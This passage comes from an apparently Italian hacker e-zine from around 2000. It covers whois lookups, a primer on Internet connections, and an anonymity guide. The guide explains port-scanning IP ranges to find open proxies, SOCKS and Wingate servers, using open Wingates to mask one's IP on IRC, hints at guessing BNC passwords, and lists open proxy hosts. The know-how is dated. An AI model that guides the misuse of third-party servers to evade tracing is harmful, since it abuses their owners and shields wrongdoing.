ricordare per via dell'hostname, è stato creato un Alias apposito 
(haxxor.xabaras.net) che ovvii a questa deficienza. nslookup è un tool che ha 
delle enormi capacità e se saprete sfruttarle non avrete bisogno di kit 
vari come CyberKit o programmi fabbricati appositamente per sgamare la provenienza
di qualcuno. Penso che più in la nelle pubblicazioni parlerò approfonditamente
dello nslookup. Gli utenti di windows 95 e 98 a questo punto saranno delusi:
e noi come cazzo facciamo allora? Beh.. potrete utilizzare uno dei tool
sopramenzionati (vedi CyberKit) oppure potrete utilizzare uno strumento
ancora più potente. Il Whois. Sotto linux esiste il comando "whois" che può dirci
la provenienza di un indirizzo IP o di un FQDN; 

quindi in pratica si otterranno altre preziose informazioni oltre a quelle
visualizzate attraverso il comando nslookup. Questo comando linux non viene
fornito nelle distribuzioni di Windows, però esistono in rete centinaia
di siti che tramite cgi apposite forniscono il servizio whois. 2 Siti
interessanti possono essere quello della internic su

http://www.internic.net/whois.html

oppure il sito:

http://www.postmodern.com/~mcb/misc/ipw.html

Basta comunque fare una ricerca su Altavista per trovarne a migliaia. Il
concetto di base è che esiste davvero un servizio chiamato "whois" che è
attivo sulla porta 43 di server specifici (provate per esempio rs.internic.net
o whois.internic.net). Quindi con il telnet possiamo fare un semplice:

telnet rs.internic.net 43

appena appuriamo che la connessione è attiva scriveremo:

whois [indirizzoip o hostname_dominio]

Ci verranno listate tutte le informazioni e la connessione cadrà. Le altre info
presenti potrebbero essere quelle di chi ha registrato il dominio, il suo 
l'indirizzo e numero di telefono, informazioni personali quali nome e cognome del 
gestore di quel dominio, i server dns che servono quell'host etc..etc..
Queste info potrebbero essere molto utili per fare del social engineering. Lì
ci sta tutto, anche le caselle postali delle persone di rilevanza per il dominio
e i loro indirizzi con le città di residenza. Per capire quali informazioni è
possibili attingere e quali invece non è possibile ottenere, fate un whois su
tin.it. (Vi consiglio comunque di andare nei siti sopra menzionati anzichè
effettuare tutta la procedura tramite telnet).

Il bello del whois è che possiamo ricercare tutti i domini registrati di una
varia nazione (volete hackare qualche server burundese per caso ? ;) 
semplicemente aggiungendo il suffisso finale nel text box della ricerca. Da 
linea di comando sarebbe un qualcosa come:

whois dom bu <---- domini burundesi se non sbaglio
whois dom de <---- domini tedeschi
whois dom jp <---- domini japponesi

e così via

Se date spazio alla fantasia potrete anche ricercare tutti gli FQDN che contengono
una determinata parola nella stringa. Insomma fate un pò voi....gli utilizzi
sono molteplici. Per fare questo tipo di ricerche il sito della internic sopra
menzionato è davvero completo...dovrete solamente comprenderne l'utilizzo.

=============================== [ NOTE CONCLUSIVE ] ===============================
L'articolo praticamente termina qui... è molto corto lo so... ed è il quinto che
ho fornito per l'uscita del primo numero di Security System, anche se non sono
un membro di alcun gruppo... quindi forte di questo fatto direi che terminare qui è
la cosa più giusta. Non so quanti lo leggeranno, anche perchè penso che saranno
davvero frustrati coloro che hanno un minimo di dimestichezza con la navigazione 
quando lo vedranno nel sommario. Daltronde questa manciata di Kbyte è quasi un
must per il primo numero di una rivista nata da poco... anche se preferirei
non vederne più articoli di questo genere. Non disdegno nulla perchè tutti siamo
partiti dai dubbi riguardanti ip, dns, reverse lookup e troiate varie, ciò sta 
solo a significare che son cose davvero già dette e ridette migliaia di volte, e 
potete trovarne i riscontri anche nel più stupido motore di 
ricerca. Avrei dovuto parlare anche del telnet (Merlinus perdonus), ma aldilà 
della definizione semplificata che vogliamo dargli, rimane pur sempre un protocollo 
che non puoi descrivere in quattro e quattr'otto.

Ecco! Questo era davvero l'ultimo articolo

Il dado è tratto... mò vediamo che cazzo succede



][^XaBaRaS^][	
										Metal Up Your Ass!!!

= **************************************************************************** =
= ================================== [ FINE ] ================================ =
= **************************************************************************** =

   
= *************************************************************************** =
= ===================== [ LA RETE, QUESTA SCONOSCIUTA ] ===================== =
= *************************************************************************** =
Autore: Acido
Luglio 2000

Internet: come funziona
  
PREMESSA
========
Bisogna conoscere alcune  informazioni tecniche su cos'è e come funziona Internet. Potreste 
pensare che non occorra conoscerle per usare la Rete, visto che, ad esempio, non occorre 
essere esperti di telecomunicazioni per usare il telefono. In realtà, vale la pena di fare un
piccolo sforzo: Internet è ben più difficile da usare del telefono e senza queste conoscenze
non andreste molto lontano.

LE BASI 
========
Cominciamo proprio dall'inizio, con una breve descrizione dei servizi telematici (i BBS ) e 
delle reti di computer. Un BBS ovvero Bulletin Board System cioè, letteralmente, bacheca 
elettronica, è un programma speciale che risiede su un certo computer e consente che altri
computer si colleghino a lui via telefono. Per usare il servizio telematico, l'utente deve
installare nel suo computer un dispositivo di comunicazione, detto modem, e collegare il 
modem alla linea telefonica. Poi, userà un programma di comunicazione per connettersi al BBS.
Potrà così sfruttare i servizi offerti dal BBS, che variano ovviamente di caso in caso.
Alcuni BBS consentono di leggere i messaggi lasciati dagli altri utenti che hanno utilizzato
il servizio in precedenza, di rispondere a questi messaggi o lasciare il proprio, o anche di 
riprodurre i file memorizzati sul disco del BBS. Altri forniscono servizi di tipo diverso; 
ad esempio consentono di giocare in linea con un altro utente di BBS a scacchi o ad altri
giochi; conversare con un altro utente, cioè scrivere quello che si vuole dire alla tastiera 
e leggere sullo schermo la risposta quasi istantanea dell'altro utente. Nel caso dei servizi 
telematici specializzati si può cercare un dato in un archivio, (ad esempio, le Pagine Gialle 
Elettroniche, oppure il registro dei protesti cambiari), piazzare un ordine di vendita o di 
acquisto di beni o servizi, e nel caso dei BBS più evoluti persino vedere fotografie o carte 
metereologiche memorizzate sul computer remoto. I servizi telematici di tipo economico-
finanziario e le Reti Civiche spesso evitano accuratamente di definirsi con il termine BBS, 
che considerano poco serio, ma il principio è lo stesso. Si tratta sempre di computer o gruppi
di computer ai quali gli utenti possono collegarsi via telefono per comunicare con altri, 
trovare file, giocare, fare ricerche, e così via. 

CIO' CHE INTERNET NON E'
======================== 
Internet non è un BBS e neppure un servizio telematico. Internet è una rete di reti. Una rete 
di computer è costituita da un gruppo di computer collegati che possono comunicare tra loro. 
Questi computer interconnessi possono mandarsi messaggi e condividere le informazioni 
memorizzate sui loro dischi.
Internet collega più di 20.000 di queste reti, e il loro numero è sempre in aumento. Su queste
reti ci sono milioni di computer, di terminali e di utenti; secondo alcune stime si tratta 
di circa due milioni di computer e circa 30 milioni di utenti. Non c'è niente di strano o 
tecnicamente avanzatissimo nelle reti di computer; sono una tecnologia ormai molto diffusa. 
Si può possedere una rete a livello privato, averne due o tre come certe piccole società o 
addirittura possederne migliaia come alcune grandi organizzazioni. Ma Internet non è una rete:
è una rete di reti. Molte reti diverse sono state unite per produrre il più numeroso gruppo 
di computer collegati tra loro del mondo. Alcune di queste reti appartengono a governi, altre
a Università, a imprese, a biblioteche e addirittura a scuole. La maggior parte sono negli 
Stati Uniti, ma parecchie si trovano in Europa (Italia compresa) e alcune si trovano oltreoceano
dall'Australia allo Zimbabwe. 
Naturalmente Internet ha funzioni ben più importanti del fare comunicare gli utenti di Paesi 
diversi attraverso una specie di posta elettronica. Ciò che rende speciale Internet è che molti
computer di ogni rete collegata agiscono come gestori di archivi. In altre parole, quando ci 
si collega ad Internet si ha l'opportunità di accedere a migliaia di sistemi differenti, che 
gestiscono archivi comunali, database universitari, cataloghi di biblioteche, messaggi di 
qualsiasi tipo e milioni di file, contenenti fotografie, documenti, video musicali e qualsiasi
altra cosa possa essere messa in forma digitale. 
L'analogia migliore che si può utilizzare per descrivere Internet è probabilmente quella con 
la normale rete telefonica. Il sistema telefonico mondiale ha molti commutatori, le centrali, 
possedute da diverse organizzazioni, tutte collegate tra loro. Quando un utente di Milano tenta
di chiamarne uno di New York, non ha bisogno di sapere quali città o quali Stati la chiamata 
attraverserà; è il sistema telefonico che fa tutto per lui. Le società telefoniche hanno 
stabilito tra loro i meccanismi di questo processo e non è necessario che l'utente sappia cosa
succede. Internet funziona nello stesso modo; così come non c'è un'unica società telefonica 
al mondo, non c'è una singola società Internet. Nessuno possiede Internet, così come nessuno 
possiede la rete telefonica mondiale. Certo, ogni singola componente è posseduta da qualcuno, 
ma la grande Rete non è posseduta da nessuno: è un sistema che continua a funzionare grazie 
all'interesse comune di tutti coloro che ne fanno parte. Nel caso del telefono, le compagnie 
telefoniche di tutto il mondo si incontrano periodicamente e concordano qual'è il sistema di 
funzionamento migliore nonché i costi e i dettagli tecnici per collegare un paese all'altro. 
Lo stesso accade per Internet. 

PERCHE' USARE INTERNET
====================== 
Ci sono centinaia di milioni di buone ragioni per usare Internet: tutte le persone che hanno 
già scelto di usare la Rete e con le quali ci si potrà collegare. Naturalmente non sono tutti 
utenti attivi; la maggior parte della gente potenzialmente collegata raramente usa altri 
computer oltre a quelli della propria organizzazione e non ha idea di quello che c'è su 
Internet. Le potenzialità tecniche e commerciali di questa platea sono comunque enormi. 
Inoltre, questo numero è puramente indicativo; in realtà nessuno sa con sicurezza quante 
persone possano essere realmente raggiunte dalla rete. Ma c'è una ragione anche migliore per
usare Internet: l'informazione che contiene. Opere letterarie, report finanziari, ricette di
cucina macrobiotica, presentazioni multimediali, per arrivare fino ai più recenti programmi
per la realtà virtuale: su Internet c'è tutto quello che si può desiderare, ed è in gran 
parte gratis! Disporre dell'informazione adeguata in tempo utile può essere addirittura vitale
per un'azienda, ma ha un valore notevole anche per l'individuo. Basta conoscere l'inglese 
(e avere seguito questo corso!) per poter scrivere annunci, entrare in contatto con persone 
che condividono i propri interessi, consultare i libri e le riviste contenuti nelle biblioteche 
che usano Internet, trovare i programmi adeguati alle proprie esigenze e così via. 

COME COLLEGARSI ? 
=================
Se siete già oppure pensate di entrare in Rete vuol dire che qualcuno ha provveduto o 
provvederà a creare tra la vostra macchina e il resto di Internet qualche tipo di collegamento.
Le aziende che forniscono questo servizio si chiamano Internet service provider, nel seguito 
semplicemente provider o ISP. Un elenco completo degli Internet provider italiani si trova... 
su Internet, all'indirizzo 
http://inews.tecnet.it.
E' un po' come mettere l'elenco dei concessionari auto in un posto raggiungibile solo in 
macchina, ma per consultarlo si può sempre ricorrere a un amico già collegato. Ci sono due 
modi principali per collegarsi a Internet, ciascuno dei quali ha una serie di varianti: 
* Collegamenti permanenti 
* Collegamenti in linea commutata 
Non sempre i tecnici e gli esperti di reti usano questi termini in modo coerente; le 
considerazioni che seguono hanno il compito di chiarire il loro significato ed evitare 
confusioni. 

COLLEGAMENTI PERMANENTI 
========================
Un collegamento permanente significa che il proprio computer (o, più spesso, la rete locale di
cui fa parte) è collegato direttamente a una rete di tipoTCP/IP che è parte di Internet. 
Solitamente sono i computer di proprietà delle grandi organizzazioni (aziende, Enti, Università)
ad essere collegati a Internet in questo modo; i privati, invece, si limitano a collegare 
temporaneamente via telefono il proprio personal a un computer che a sua volta è collegato 
permanentemente alla rete. La sigla TCP/IP significa Transmission Control Protocol/Internet 
Protocol, ovvero Protocollo di controllo di trasmissione/protocollo di Internet. 
Un protocollo è l'insieme di regole che definisce come un computer deve parlare all'altro; 
i prossimi paragrafi tratteranno meglio questo argomento. Per ora basti sapere che qualunque 
sia il tipo di rete utilizzato all'interno della propria organizzazione, per collegarsi 
permanentemente a Internet bisogna che il proprio computer parli, almeno verso l'esterno, 
il linguaggio TCP/IP. 

COME CREARE UN COLLEGAMENTO PERMANENTE 
=======================================
Se si è il responsabile di un'azienda che dispone di una propria rete e si desidera connetterla
permanentemente a Internet, la prima cosa da fare è prendere contatto con un provider che sarà
anche il punto fisico di connessione alla rete globale.
Poi, bisogna collegare sulla propria rete un apparecchio detto router che farà da interprete, 
parlando in TCP/IP con il computer del provider e nel protocollo opportuno (lo stesso TCP/IP, 
o comunque quello usato dalla rete aziendale) con le macchine dell'azienda. Infine, occorre 
affittare da Telecom o da altri una linea telefonica dedicata che colleghi il router installato
in azienda al computer del provider. I dettagli variano a seconda dei casi: il provider può 
procurare lui stesso il router oppure suggerire all'organizzazione cliente quale comprare. 
Poiché la linea telefonica è dedicata, è sempre attiva. Non c'è bisogno di telefonare ogni 
volta per raggiungere il computer del provider; ogni utente dell'organizzazione cliente potrà 
collegarsi a Internet direttamente dal proprio solito posto di lavoro. Una volta collegato, 
potrà trasferire i file dal proprio computer agli altri computer di tutto il mondo che sono 
collegati a Internet e viceversa. Naturalmente, questo tipo di servizio è molto caro: al costo
del servizio di connessione e del router, infatti, va aggiunto quello non indifferente del 
noleggio della linea Telecom. 
Se siete già collegati alla Rete attraverso una rete aziendale o scolastica, il vostro 
personal computer farà già probabilmente parte di una rete locale (local area network, LAN).
Invece di un modem, il vostro personal avrà una scheda di rete che lo collega alla rete 
locale; il cavo che esce dalla scheda può assomigliare al cavo telefonico o al cavo coassiale
usato per l'antenna della televisione. Se usate Internet dalla rete dell'ufficio o della 
scuola, è sicuro che anche la vostra rete è connessa a un provider; è però probabile che il
collegamento non avvenga tramite un modem, ma attraverso una linea permanente a velocità 
maggiore (tipicamente, da 64 kbps a 2 Mbps) affittata annualmente dalla società telefonica. 

COLLEGAMENTI SU LINEA COMMUTATA 
================================
Gli utenti che si collegano a Internet da casa arrivano a un provider usando un modem che 
funziona sui fili telefonici normali. Presso la sede del provider vi è un altro modem 
convenzionale; può essere un modello industriale, oppure, se il provider vuol risparmiare, 
può essere come il vostro. La velocità di connessione è quella del più lento tra i due modem 
(nel migliore dei casi e non considerando fattori come il rumore) e va dai 2,4 kilobit al 
secondo (kbps) a 33,6 kbps. Un collegamento di questo tipo, detto in linea commutata è un 
collegamento che usa il protocollo SLIP (Serial Line Internet Protocol, protocollo Internet 
su linea seriale), CSLIP (Compressed SLIP, SLIP compresso), o PPP (Point-to-Point Protocol,
protocollo punto-punto) per collegarsi a un Internet provider attraverso una normale linea 
telefonica e un modem.
"Connessione PPP" significa che, telefonando al computer del provider, il vostro computer 
riceverà un suo numero identificativo (l'indirizzo IP) che lo renderà visibile su Internet 
per tutta la durata della chiamata. Tramite appositi programmi, vi sarà così possibile 
consultare informazioni sugli altri computer di Internet. 'Linea commutata' vuol dire che il 
collegamento usa la normale rete telefonica, il che in genere limita la velocità massima 
(che dipende dal tipo di modem) a 28,8 kbps. Anche questi sono collegamenti di tipo TCP/IP, 
come il collegamento permanente, ma sono destinati ad essere usati sulle usuali linee 
telefoniche, anziché su una linea dedicata. Naturalmente c'è una certa differenza in fatto di
prestazioni: i trasferimenti di dati tra il computer dell'utente e gli altri saranno 
sensibilmente più lenti. Il modem è in grado di chiamare il numero telefonico che viene
comunicato dal provider. La telefonata avviene sulle linee telefoniche Telecom, le stesse 
che portano la voce; le tariffe applicate sono quindi quelle usuali per le conversazioni 
telefoniche. In alternativa, ci sono i collegamenti ISDN (Integrated System Digital Network).
Quasi tutti i provider italiani offrono oltre alla ´connessione PPP in linea commutata' 
anche la ´connessione PPP via ISDN'. Per  usarla dovete prima chiedere a Telecom di trasformare
in ISDN la vostra presa telefonica, per un costo di circa duecentomila lire. Poi le tariffe 
sono di poco superiori a quelle delle chiamate tradizionali anche se la velocità.. è tutta 
un'altra musica. Per ora, la velocità di connessione ISDN è di 64 kbps, ma può arrivare a 
128 kbps, cioè circa cinque volte più veloce di un modem tradizionale. Infine, va osservato 
che le connessioni PPP si possono fare anche affittando da Telecom delle linee dedicate, 
riservate cioè alla connessione tra utente e provider. Ma anche le più economiche hanno costi 
di molti milioni all'anno e sono rivolte all'utenza aziendale.
Comunque, indipendentemente dal tipo di linea, una volta composto il numero ed effettuato il
collegamento con il computer del fornitore non ci sarà più alcuna differenza tra il 
collegamento PPP e un collegamento dedicato; si potranno, cioè, trasferire dei dati dal 
proprio computer a qualsiasi altro connesso alla rete Internet e viceversa. 

VANTAGGI E SVANTAGGI DEI VARI TIPI DI COLLEGAMENTO
===================================================
Il collegamento permanente è caro, ma può essere considerato un buon investimento per le 
grosse società. Una volta collegati, infatti, si possono avere tanti utenti quanti sono i 
computer della società e la linea dedicata conviene, poichè non c'è alcun addebito legato 
al numero degli utenti individuali. Se ci sono molti utenti, il collegamento permanente di 
tutta l'azienda può risultare più economico rispetto alla scelta di fornire ad alcuni utenti
VIP un proprio collegamento autonomo, specialmente se la maggior parte degli utenti "normali"
usa Internet con bassa frequenza o per solo pochi minuti al giorno. Comunque, la connessione 
permanente resta una soluzione per pochi: i servizi specializzati sono molto cari. Il 
collegamento in linea commutata via modem, sebbene inferiore a quello permanente, è molto più 
economico. E' necessario però disporre di un modem ad alta velocità (almeno 28.800 bit al 
secondo) e a correzione di errore. Comunque, chi si collega da casa può stare tranquillo: ci 
sono nuove tecnologie che consentono agli utenti domestici di accedere a Internet a velocità
superiore. Una possibilità è il servizio ISDN (Integrated Services Digital Network), che usa
il collegamento telefonico esistente, ma sostituisce i modem con speciali adattatori digitali.
ISDN è già oggi una buona scelta: è accettato da un numero crescente di provider, è sicuro e
non troppo costoso, sebbene costi un po' più del normale servizio telefonico. Un altro 
servizio che permette collegamenti superveloci a Internet lungo le normali linee telefoniche 
è ADSL (Asymmetric Digital Subscriber Line, Linea digitale asimmetrica). Questo servizio non 
è ancora disponibile in Europa, ma prevede connessioni a velocità fino a 6 Mbps "a favore di 
corrente" (da Internet al vostro computer) e 640 kbps "contro corrente" (viceversa). Sebbene 
sia ancora lontana dall'essere onnipresente, ISDN è disponibile in Italia fin dagli anni '80 
ed è la più diffusa tra le tecnologie di connessione digitale per l'utenza privata. Le reti 
cellulari e i sistemi di invio via satellite sono in fase di sperimentazione per il trasporto 
Internet; quest'ultima secondo molti esperti sarà la tecnologia del futuro.
Ma la rassegna delle tecnologie non è finita qui: l'accesso a Internet attraverso la 
connessione televisiva via cavo è uno strumento nuovissimo per cui si prevede un grande 
futuro, anche se non in Italia, dove la rete televisiva via cavo è praticamente inesistente. 
I sistemi di accesso a Internet tramite la rete della TV via cavo prevedono velocità di 
500 kbps a 30 Mbps. Lo stesso cavo che porta il segnale della televisione viene usato per 
Internet: il servizio verrà fornito dalle stazioni televisive via cavo, che dovranno 
diventare provider.
Ad un singolo individuo, comunque, non conviene mai acquistare un collegamento permanente. 
Esso richiede router, linee dedicate e altri dispositivi molto costosi. Anche le spese 
iniziali e le tariffe annuali sono molto elevate. Se si vuole un servizio diretto in linea,
basta invece pagare una (ragionevole) tariffa iniziale di collegamento. Poi si paga in 
proporzione all'utilizzo, secondo una tariffa oraria che è diversa durante il giorno e da 
mezzanotte alle otto del mattino. C'è molta varietà nelle tariffe e nelle modalità di 
pagamento, quindi conviene contattare il maggior numero possibile di provider.

LE ARTERIE DI INTERNET 
=======================
Le arterie di Internet sono le linee dorsali , che sono gestite dai fornitori di Internet 
"all'ingrosso", i cosiddetti National Service Provider o NSP. Gli utenti si collegano agli 
ISP locali attraverso i modem, gli adattatori ISDN o altri strumenti, mentre gli ISP locali 
si connettono a loro volta alle reti di NSP come Interbusiness di Telecom, Unisource, Sprint
o (nel caso degli utenti universitari) il Gruppo Autonomo Reti Ricerca o GARR. Alcuni NSP 
forniscono anche il servizio agli utenti finali, sebbene il loro principale interesse sia 
comunque la fornitura all'ingrosso. Gli ISP si collegano agli NSP attraverso linee dedicate 
affittate dalla Telecom. Le connessioni migliori sono le linee dette T1 a 2 Mbps; i provider
più grossi possono avere connessioni T1 multiple. Al loro interno, gli NSP usano le loro reti
private, composte anch'esse di linee dedicate affittate ricorrendo a Telecom Italia per il 
tratto in territorio italiano e ad altre società per i tratti internazionali (in Europa, 
British, France e Deutsche Telecom; in America WilTel, MCI e Sprint). Queste ultime società 
sono proprietarie dei cavi in rame, fibra ottica e delle connessioni via satellite attraverso
cui corrono insieme le normali conversazioni telefoniche e il traffico Internet. Le reti 
degli NSP di solito funzionano a velocità T1 localmente, ma arrivano a velocità superiori 
per le lunghe distanze. Le connessioni T3 con gli Stati Uniti corrono a 44,736 Mbps. 
In America le cose vanno ancora meglio: la rete su fibre ottiche (OC3) di MCI funziona 
a155,52 Mbps (5500 volte più veloce di un modem a 28,8 kbps). ed alcune linee superveloci 
viaggiano a più di 600 Mbps. 
Questo è solo un assaggio... nel prossimo numero parleremo di altre reti, protocolli di 
trasmissione e tanto ancora...

										By Acido

= *************************************************************************** =
= ================================ [ THE END ] ============================== =
= *************************************************************************** =


= *************************************************************************** =
= =================== [ Anonimato su internet: presto fatto ] =============== =
= *************************************************************************** =

Autore: AsM

Credete che la vostra navigazione in internet sia anonima?
Che quando vi collegate in chat e usate Nick strani nessuno vi possa
riconoscere?
Vi sbagliate di grosso, ogni volta che visitate un sito ogni volta che
chattate o che scaricate un mp3, lasciate delle traccie, con le quali
si può risalire a voi.
In questa guida imparerete come nascondervi in Internet, navigare senza
essere visti, con un "perfetto" anonimato.

 PROXY SERVER
 ==============

I server Proxy sono computers (o software che ne simulano la presenza)
che fungono da intermediari fra una workstation e internet.
Di solito viene usato nelle reti locali (LAN) quando si vuole
condividere un solo collegamento internet a tutti i computer collegati
alla LAN.
Ogni volta che un PC della LAN cerca di accedere al web ad esempio per
visitare un sito, inconsapevolmente si connette col proxy il quale 
provvede a mettersi in contatto con quel sito, leggere le informazioni
e rispedirle al PC. Tutte le informazioni in ingresso e in uscita dalla
LAN passano quindi per il proxy.


 Servizio HTTP
 ===============

Uno dei pericoli peggiori per lasciare tracce sul web sono i cookei,
semplici file di testo che possono prendere molte informazioni sul 
vostro conto, ad esempio da quale pagina provenivate, il vostro sistema
operativo che client utilizzate, il vostro IP ecc...
Naturalmente nei più comuni browser c'è la possibilità di attivare o
disattivare l'invio di questi cookei, basta cercare nelle opzioni e 
disattivarli.
Per raggiungere un livello di anonimato più alto ci sono molte altre
tecniche come quella dell'uso dei server PROXY.
In pratica quando vi connetterete ad un sito questo verra spedito al
server PROXY, che vi collegherà e scaricherà le pagine al posto vostro,
ma L'ip registrato dal sito sarà quello del proxy, in quanto è stato il
server PROXY a collegarsi al sito e non voi.

Ma come si configura il browser per utilizzare un server PROXY?
In questa guida vi spiegherò come configurare i due principali browser
Netscape e Microsoft Explorer (anche se preferisco il primo).

NETSCAPE
Dal menù preferences di Netscape selezionate advanced e poi proxies, 
quindi manual proxy configuration e poi il bottone view.
Ora potrete inserire nella prima riga (HTTP) il nome del server proxy 
e poi la porta (di solito 8080).
Noterete che ci sono altre caselle libere: FTP, Gopher, ecc. 
Se il proxy server supporta quei servizi, inserite nome del server e 
porta nelle rispettive locazioni e potrete accedere anonimamente anche
a quei servizi.

EXPLORER 5.0
Dal menù strumenti Opzioni Internet di Explorer selezionate Connessioni
e cliccate sul bottone Impostazioni Lan...
Cliccare su Utilizza un server proxy e inserire l'indirizzo e la porta.
Se volete gestire più servizi (FTP Gopher ecc...) cliccate su avanzate 
e inserire i rispettivi indirizzi dei proxy server.

Tenete presente che anche i proxy server registrano il vostro IP 
address, quindi non fate stupidaggini. 
Se proprio volete un maggiore grado di sicurezza, concatenate i server
in questo modo:

http://proxy1:porta/http://proxy2:porta/http://www.sito.it/

Per trovare questi proxy server consiglio di usare due metodi che a 
parere mio sono i migliori.
Il primo anche se meno efficace ma più semplice è quello di sfruttare i
motori di ricerca utilizzando i vari comandi, in questo caso
utilizzeremo il comando URL.
La maggior parte dei server proxy iniziano il loro indirizzo con proxy.
(esempio proxy.ciccio.it) quindi basterà mettere nei motori di ricerca
il comando URL: seguito da proxy. (URL:proxy.)

Il secondo metodo è quello di usare un semplice scan port a più 
indirizzi.
Io uso TCP Port Scanner della DataSet il quale da un Ip di partenza 
(110.5.9.1) cerca le porte (in questo caso 8080) fino ad un ip finale 
(110.5.255.255 ricordate di non mettere valori superiori a 255).

Per verificare se il proxy trovato funzioni realmente configurate il 
browser con il proxy server e visitate il sito: 
http://cavency.virtualave.net/cgi-bin/env.cgi


			BREVE LISTA DI SERVER PROXY

httpproxy.math.uwaterloo.ca:8080  
cache1.worldcom.ch:8080  
sigma.unisg.ch:8080  
proxy.mcmail.com:8080  
cf1000.east.cacheflow.com:8080  
proxy.compunet.net.co:8080  
linux.softec.es:8080  
proxy.inet.fi:8080  
openview.dnet.it:8080  
dns1.infocom.co.jp:8080  
cvs2.kyunghee.ac.kr:8080  
biho.taegu.ac.kr:8080  
data450.dm.net.lb:8080  
cf.webzone.net:8080  
cacheflow1.deltacom.net:8080  
proxy.coqui.net:8080

Ora siete pronti per navigare, e ciò avverrà in modo trasparente sia 
per voi che per la macchina alla quale vi collegate.



 Servizio IRC
 =============
Un altro servizio molto importate di internet sono le Chat, un modo
come un altro per fare conoscenze.
Ma pultroppo non sempre si incontrano brave persone "vedi Lamer".
Queste con disgrazia vostra possono farvi disconnettere o cadere da
IRC con i vari metodi (Nuke, Flood, smurf ecc...) tutto questo avendo
il vostro IP visibile a tutti (non in tutti i server IRC) tramite il
comando /dns nick.
Esistono vari metodi per nascondere il proprio ip in irc, i principali
sono tre: firewall Sock, Wingate e BNC.

FIREWALL SOCK
I sock sono dei servizi disponibili in alcuni server.
Questi possono essere usati per nascondere il proprio IP semplicemente
collegandosi prima al Sock, e poi al server IRC; in pratica è lo stesso
funzionamento dei proxy server.
In questa guida vi spiegherò come configurare un Sock con il mIRC (uno
dei migliori programmi in circolazione).

Per una corretta configurazione eseguite tutti i 9 punti.

1- Cliccate su opzioni dal menù file (ALT+O).
2- Espandete la voce Connect
3- Cliccate su Firewall
4- A destra comparirà una schermata, cliccate su Use SOCK firewall.
5- Selezionate Socks4 nella parte protocol (dipende i firewall può 
   anche essere usato il protocollo Socks5)
6- Inserite l'ip o l'host del Sock trovato nella casella hostname
7- Lasciate in bianco USERid e PASSWORD.
8- Come porta lasciate qualla standard la 1080.
9- Cliccate su OK per confermare il tutto.

Adesso siete pronti per connettervi al server irc che preferite.
Attenzione però, i nuovi server IRC prima di farvi connettere fanno un
controllo delle porte e se vedono la 1080 vi killano o addirittura vi
mettono in G-line.
Però ricordate che una rete IRC è fatta da più server quindi se non si
connette con uno non è detto che deve fare lo stesso con un altro
(scrivere /links per vedere la lista dei server linkati).

I Sock Firewall non sono molto difficili da trovare, basta avere un po
di fortuna e un buon scan port (usare lo stesso metodo per ricercare i
server proxy cambiare la porta 8080 con 1080).

Potete usare anche dei comuni script per mIRC per trovare i Sock, la
maggior parte hanno uno scan il quale ogni volta che entra o esce un
untente controlla se ha la porta 1080 aperta (controllate negli
allegati, troverete un SockScan).


WINGATE
I wingate sono sempre dei servizi del server i quali usano come porta
la 23.
Una volta trovato un Wingate, è possibile Spoofare, cioe' entrare in 
chat con un altro Ip come per i Firewall Sock.
Ad esempio se io ho l'ip 165.325.205.215 e l'ip del Wingate è 
194.243.202.202 io avrò su IRC l'ip del wingate e il mio resterò
nascosto.
Purtroppo i Wingate sul server non sono sempre fissi, e magari una 
volta funzionano e la prossima no.
Per avviare il Wingate eseguite alla lettera questi 6 passi.
1- Aprite il mIRC o un altro client per IRC.
2- Scrivete nella finestra status i seguenti comandi.
3- /server Ip_del_Wingate 23 (esempio: /server 194.243.202.202 23) 
3- /quote server SERVER_DOVE_COLLEGARTI 6667 (esempio irc.musichat.net
   6667)
4- /quote user ciccio ciccio ciccio ciccio ciccio
5- /quote nick Nick_che_vuoi_usare (esempio AsM)

ATTENZIONE: alcuni wingate usano il comando raw apposto di quote.
Benissimo...
Ma il dilemma è: Come faccio a trovare un Wingate?
Per trovare un Wingate c'è bisogno di uno scan apposito, io uso 
wGateScan v2.2, è facilmente reperibile da internet.

Settate il wingate scan in questo modo:
1- Inserite l'host name o l'ip nella casella HOST NAME OR IP
   ATTENZIONE scrivete solo le iniziale dell'ip ad esempio abbiamo
   un ip 125.205.658.544 noi dobbiamo scrivere solo le prime due cifre
   in questo caso 125.205 in modo tale che lo scan metterà le due cifre
   rimanenti da 0 a 255.
2- Premete su bottone Scan!

Lo scan vi comunicherà in seguito il ritrovamento di qualche wingate,
ma non è detto che deve funzionare per forza, quindi prima di gridare
Vittoria ma assicuratevi che funzioni eseguendo i comandi spiegati 
sopra.

BNC
I BNC sono simili ai wingate solo che al contrario non usano una porta
standard come nei Socks, appunto per questo sono molto difficili da
trovare, e anche trovandoli la maggior parte per usarli ci vuole una
password.
In questa guida vi spiegherò solo il loro utilizzo.
Allora passiamo subito ai comandi da scrivere nel vostro client (mIRC).

1- Aprite il client per IRC (consigliato mIRC)
2- Nella finestra status scrivete i seguenti comandi.
3- /server host_del_server porta (esempio 127.0.0.1 8000)

Arrivati a questo punto il BNC sicuramente vi chiederà di inserire la
password.
Scrivete il comando /quote pass password.
Se il BNC è vostro o avete tanta fortuna da azzeccare la password cosa
non facile, il bnc vi chiederà il server IRC da connettersi.

ATTENZIONE!!! alcuni BNC non fanno accedere determinate serie di host
(esempio non fanno accedere tutti i domini italiani *.it) quindi fate
un po voi.

I comandi dei BNC pultroppo cambiana a seconda degli stessi, comunque
si può accedere alla guida tramite il comando /quote help oppure in
psyBNC usare il comando /quote bhelp, in ogni caso non vi create alcun
problema sicuramente nel motd (messaggio iniziale) troverete scritto il
comando per visualizzare la guida.

In psyBNC i principali comandi sono:
Per aggiungere un server IRC dalla lista.
/quote addserver host:6666 tuapass

Per cancellare un server IRC dalla lista.
/quote delserver sever che hai messo

Per entrare nel server IRC.
/quote jump localhost:6666 tuapass


 Servizio FTP
 =============
Chi da internet non ha mai scaricato un programma o un MP3 tramite un
server FTP.
Ma pensate di lasciare il vostro indirizzo IP a destra e a sinistra?
In questa sezione vi spiegherò come sia semplice nascondere il proprio
host dall'Admin di un server FTP.
Prendete il vostro client FTP io consiglio di usare WS_FTP è semplice
e intuitivo.

Per nascondere il vostro IP con WS_FTP eseguite i seguenti passaggi:
1- Avviate il client.
2- Nella schermata Proprietà selezionate Firewall.
3- Selezionate il segno di spunta use Firewall.
4- Nella casella di testo Host Name scrivete l'host del firewall.
5- User ID e Password di solito vengono lasciati vuoti.
6- Nella casella di testo Port mettere la porta del firewall.
7- Nel gruppo firewall Type selezionate il modo più opportuno per il
   vostro firewall (di solito si usa il modo USER after logon).
8- Fatto questo ritornate su general, settate il server FTP e cliccate
